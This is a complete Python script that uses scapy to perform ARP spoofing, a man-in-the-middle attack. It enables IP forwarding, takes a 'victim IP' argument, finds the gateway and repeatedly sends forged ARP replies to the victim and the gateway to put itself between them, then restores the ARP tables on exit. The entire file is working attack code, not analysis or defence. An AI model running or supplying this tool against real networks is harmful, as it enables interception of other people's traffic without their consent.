#!/usr/bin/env python

import subprocess
import re
import argparse
import scapy.all as scapy
import time
import sys

def linux_presettings():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target_ip", dest="target_ip", help="victim IP")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("Please, specify a target IP, use --help for more info")
    return options

def get_gateway_ip():
    result = subprocess.check_output(["ip", "route"])
    gateway_ip = re.search(r"(?<=via ).*(?= dev)", str(result))
    return gateway_ip.group(0)

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)

linux_presettings()
gateway_ip = get_gateway_ip()
target_ip = get_args().target_ip

sent_packets_count = 0
measure = 0
print("Packets sent\tSeconds passed\n------------------------------")
start = time.time()
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        measure = time.time() - start
        print("\r" + str(sent_packets_count) + "\t\t" + str(measure)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetecting 'CTRL+C'... Resetting ARP-tables... Please wait...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("ARP-tables were resetting successfully!")
except BaseException:
    print("WARNING! Something get wrong!")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("ARP-tables were resetting successfully!")
